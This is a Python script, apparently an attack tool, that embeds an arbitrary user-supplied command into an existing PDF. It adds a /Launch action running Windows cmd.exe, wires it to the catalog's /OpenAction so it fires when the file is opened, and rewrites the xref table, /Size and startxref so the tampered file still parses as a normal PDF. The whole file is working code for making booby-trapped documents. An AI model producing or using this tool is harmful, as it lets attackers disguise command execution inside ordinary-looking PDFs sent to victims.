import re

filename = input("Enter input filename: ")

try:
    with open(filename, 'rb') as f:
        data = f.read()
except FileNotFoundError:
    print("File not found, make sure your file is in the same directory as this script.")
    exit(1)

inp = input("Enter command you want to execute: ")

output_file = input("Enter output filename: ")

#find xref table contents
xref_start = data.find(b'xref')
xref_end = data.find(b'trailer')
xref_end2 = data.rfind(b' ', xref_start, xref_end)
xref_end = data.find(b'\n', xref_end2) + 1

#find /Size in trailer
size_start = data.find(b'/Size')
size_end = data.find(b'\n', size_start)

#find xref offset
xref_offset_start = data.find(b'startxref')
xref_offset_end = data.find(b'%%EOF')

num_of_obj = int(data[size_start+6:size_end])

cmd = str(num_of_obj).encode() + b' 0 obj\n  << /Type /Action\n     /S /Launch\n     /F (C:\\\\Windows\\\\System32\\\\cmd.exe)\n     /Win <<\n       /F (C:\\\\Windows\\\\System32\\\\cmd.exe)\n       /P (/C ' + inp.encode() + b')\n     >>\n  >>\nendobj\n'

xref_offset = int(data[xref_offset_start+10:xref_offset_end])

xref = data[xref_start:xref_end]

#adding or rewriting /OpenAction
open_action_start = data.find(b'/OpenAction')
if open_action_start == -1:
    catalog_start = data.find(b'/Catalog')
    cat_offset = data.find(b'\n', catalog_start)
    open_action_start = cat_offset+1
    open_action_end = open_action_start
    new_open_action_value = b'/OpenAction ' + str(num_of_obj).encode() + b' 0 R\n'
    new_open_action_len = len(new_open_action_value)
else:
    open_action_end = data.find(b'\n', open_action_start)

    open_action = data[open_action_start:open_action_end]
    open_action_value = open_action[12:]
    open_action_len = len(open_action_value)

    new_open_action_value = str(num_of_obj).encode() + b' 0 R'
    new_open_action_len = len(new_open_action_value) - open_action_len
    open_action_start += 12

#getting object offsets, so they can be updated if /Catalog is not the last object
pattern = re.compile(r'\b(\d{10} \d{5} [A-Za-z])\b')
matches = pattern.findall(xref.decode('utf-8'))
last_obj = matches[-1]

for index, match in enumerate(matches):
    if index == 0:
        continue
    addr_start = int(match.split(' ')[0])
    addr_end = data[addr_start:].find(b'endobj')
    if b'/Type /Catalog' in data[addr_start:addr_start+addr_end]:
        if index != len(matches)-1:
            for m in matches[index+1:]:
                addr_start_old = int(m.split(' ')[0])
                addr_start_new = addr_start_old + new_open_action_len
                formatted_byte_string = '{:010d}'.format(addr_start_new)
                new_xref_obj_addr = formatted_byte_string.encode()
                pattern = re.compile(b'0*' + re.escape(str(addr_start_old).encode()))
                data = pattern.sub(new_xref_obj_addr, data)

last_obj_addr = int(last_obj.split(' ')[0])

last_obj_val = data[last_obj_addr:xref_start]

last_obj_len = len(last_obj_val)

new_offset = last_obj_addr + last_obj_len + new_open_action_len
new_xref_obj_addr = str(new_offset).encode()

formatted_byte_string = '{:010d} 00000 n'.format(int(new_xref_obj_addr.decode()))
new_xref_obj = formatted_byte_string.encode() + b'\n'

new_xref_offset = xref_offset + len(cmd) + new_open_action_len

data = data[:xref_offset_start+10] + str(new_xref_offset).encode() + b'\n' + data[xref_offset_end:]

num_of_obj += 1
data = data[:size_start+6] + str(num_of_obj).encode() + data[size_end:]

data = data[:xref_end] + new_xref_obj + data[xref_end:]

xref_size_start = data[xref_start:xref_end].find(b' ') + 1
xref_size_end = data[xref_start + xref_size_start:].find(b'\n')

data = data[:xref_start+xref_size_start] + str(num_of_obj).encode() + data[xref_start+xref_size_start+xref_size_end:]

data = data[:xref_start] + cmd + data[xref_start:]

data = data[:open_action_start] + new_open_action_value + data[open_action_end:]

with open(output_file, 'wb') as f2:
    f2.write(data)


